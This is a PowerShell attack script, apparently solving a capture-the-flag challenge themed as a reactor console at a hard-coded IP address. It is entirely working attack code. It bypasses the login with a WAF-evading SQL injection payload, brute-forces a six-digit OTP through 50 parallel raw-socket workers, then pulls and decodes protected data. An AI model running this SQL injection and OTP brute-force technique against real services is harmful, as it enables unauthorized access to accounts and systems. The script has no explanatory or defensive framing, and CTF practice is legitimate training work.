$BASE = "http://52.66.177.113"
$HOSTIP = "52.66.177.113"

# --- Stage 1: WAF-bypass SQLi login ---
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
Invoke-WebRequest "$BASE/login.php" -WebSession $session -UseBasicParsing | Out-Null
$rawUser = "zzz')||1#"
$encUser = [Uri]::EscapeDataString($rawUser)
$loginBody = "username=$encUser&password=x&login=1"
try {
    Invoke-WebRequest "$BASE/login.php" -Method POST -Body $loginBody -ContentType "application/x-www-form-urlencoded" -WebSession $session -UseBasicParsing -MaximumRedirection 0 -ErrorAction Stop | Out-Null
} catch {}
$SID = ($session.Cookies.GetCookies($BASE) | Where-Object { $_.Name -eq "PHPSESSID" }).Value
Write-Host "Stage 1 OK. SID=$SID"

# --- Stage 2: OTP ---
$d = Invoke-WebRequest "$BASE/dashboard.php" -WebSession $session -UseBasicParsing
$pos6 = [Convert]::ToInt32($d.Headers["X-Reactor-Terminal"], [int]$d.Headers["X-Reactor-Radix"])
$pos1 = 4
Write-Host "pos1=$pos1 pos6=$pos6 -> pattern $pos1????$pos6"

# Fast raw HTTP brute using sockets - reuse keep-alive
function Try-Code($mid) {
    $code = "$pos1$mid$pos6"
    $body = "code=$code"
    $req = "POST /otp.php HTTP/1.1`r`nHost: $HOSTIP`r`nCookie: PHPSESSID=$SID`r`nContent-Type: application/x-www-form-urlencoded`r`nContent-Length: $($body.Length)`r`nConnection: close`r`n`r`n$body"
    try {
        $c = New-Object System.Net.Sockets.TcpClient($HOSTIP, 80)
        $s = $c.GetStream()
        $bytes = [System.Text.Encoding]::ASCII.GetBytes($req)
        $s.Write($bytes, 0, $bytes.Length)
        $s.Flush()
        $reader = New-Object System.IO.StreamReader($s)
        $statusLine = $reader.ReadLine()
        $c.Close()
        return $statusLine
    } catch { return "" }
}

$otp = $null
# Brute with runspaces using raw sockets (fast)
$pool = [RunspaceFactory]::CreateRunspacePool(1, 50)
$pool.Open()
$jobs = New-Object System.Collections.Generic.List[object]
$sb = [scriptblock]::Create(@"
param(`$mid, `$SID, `$pos1, `$pos6, `$HOSTIP)
`$code = "`$pos1" + `$mid + "`$pos6"
`$body = "code=`$code"
`$req = "POST /otp.php HTTP/1.1``r``nHost: `$HOSTIP``r``nCookie: PHPSESSID=`$SID``r``nContent-Type: application/x-www-form-urlencoded``r``nContent-Length: `$(`$body.Length)``r``nConnection: close``r``n``r``n`$body"
try {
    `$c = New-Object System.Net.Sockets.TcpClient(`$HOSTIP, 80)
    `$s = `$c.GetStream()
    `$bytes = [System.Text.Encoding]::ASCII.GetBytes(`$req)
    `$s.Write(`$bytes, 0, `$bytes.Length); `$s.Flush()
    `$reader = New-Object System.IO.StreamReader(`$s)
    `$status = `$reader.ReadLine()
    `$c.Close()
    if (`$status -match "302") { return `$code }
} catch {}
return `$null
"@)

foreach ($m in 0..9999) {
    $mid = $m.ToString("0000")
    $ps = [PowerShell]::Create(); $ps.RunspacePool = $pool
    $null = $ps.AddScript($sb).AddArgument($mid).AddArgument($SID).AddArgument($pos1).AddArgument($pos6).AddArgument($HOSTIP)
    $jobs.Add([PSCustomObject]@{ PS=$ps; H=$ps.BeginInvoke() })
}
foreach ($j in $jobs) {
    $res = $j.PS.EndInvoke($j.H)
    if ($res) { $otp = $res; break }
    $j.PS.Dispose()
}
$pool.Close()
Write-Host "Stage 2 OK. OTP=$otp"

# Unlock main session + open console
Invoke-WebRequest "$BASE/otp.php" -Method POST -Body "code=$otp" -ContentType "application/x-www-form-urlencoded" -WebSession $session -UseBasicParsing -MaximumRedirection 0 -ErrorAction SilentlyContinue | Out-Null
Invoke-WebRequest "$BASE/nuclear.php" -WebSession $session -UseBasicParsing | Out-Null

# --- Stage 3: decode nodes ---
Write-Host "`nStage 3:"
$coords = @()
foreach ($i in 1..8) {
    $t = (Invoke-WebRequest "$BASE/data.php?id=electron$i" -WebSession $session -UseBasicParsing -Headers @{ "X-Requested-With" = "reactor-console" }).Content.Trim()
    Write-Host "electron${i}: $t"
    if ($t -match '^[01 ]+$') {
        $coords += (-join (($t -split ' ') | ForEach-Object { [char][Convert]::ToInt32($_, 2) }))
    }
}
Write-Host "`nTARGET COORDS: $($coords -join '  ')"
